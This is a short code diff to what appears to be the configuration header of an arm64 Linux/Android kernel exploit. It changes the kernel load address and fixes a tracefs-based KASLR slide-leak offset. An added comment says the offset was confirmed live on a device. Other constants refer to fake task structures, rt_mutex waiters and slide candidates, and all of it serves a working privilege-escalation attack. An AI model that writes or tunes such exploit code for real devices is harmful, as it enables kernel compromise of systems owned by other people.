@@ -21,7 +21,7 @@
 #define KIMAGE_TEXT_BASE 0xffffffc008000000ULL
 #define P0_PAGE_OFFSET 0xffffff8000000000ULL
 #define P0_PHYS_OFFSET 0x80000000ULL
-#define P0_KERNEL_PHYS_LOAD 0xa8000000ULL
+#define P0_KERNEL_PHYS_LOAD 0xa8068000ULL
 
 #define SKB_DATA_DELTA (-0x1000LL)
 
@@ -32,7 +32,13 @@
 #define SLIDE_USE_FAKE_TASK 1
 #define COMPACT_RT_MUTEX_WAITER 1
 #define SLIDE_TRACEFS_EVENT_ID 108
-#define SLIDE_TRACEFS_WORKER_CALLER_OFF 0x0010dd84ULL
+/* worker_thread symbol offset is 0x0010dd84; the sched_blocked_reason
+ * tracepoint fires from the call site at worker_thread+0x78 (confirmed live
+ * on-device via /sys/kernel/tracing/trace: "caller=worker_thread+0x78"),
+ * so the tracefs slide leak needs that call-site offset, not the bare
+ * function start, or the recovered candidate is always off by 0x78 and
+ * fails the 64KB-alignment check every time. */
+#define SLIDE_TRACEFS_WORKER_CALLER_OFF 0x0010ddfcULL
 #define SLIDE_PSELECT_WORD_SHIFT 2
 #define SLIDE_P0_OFFSET_CANDIDATES \
   0x000000ULL, 0x010000ULL, 0x020000ULL, 0x030000ULL, \
